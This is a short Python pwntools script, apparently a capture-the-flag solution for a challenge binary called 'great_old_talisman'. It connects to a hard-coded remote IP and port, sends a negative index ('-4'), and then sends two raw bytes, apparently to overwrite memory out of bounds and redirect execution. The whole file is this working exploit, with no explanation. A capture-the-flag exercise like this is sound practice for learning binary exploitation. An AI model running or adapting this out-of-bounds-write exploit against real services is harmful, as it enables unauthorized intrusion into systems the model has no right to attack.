from pwn import *

ip, port = '83.136.254.199', 51633
io = remote(ip, port)
#io = process('./great_old_talisman')

io.recvuntil('>>');
io.sendline('-4');
io.recvuntil('Spell:');
io.sendline('\x5a\x13');
print(io.recvall())
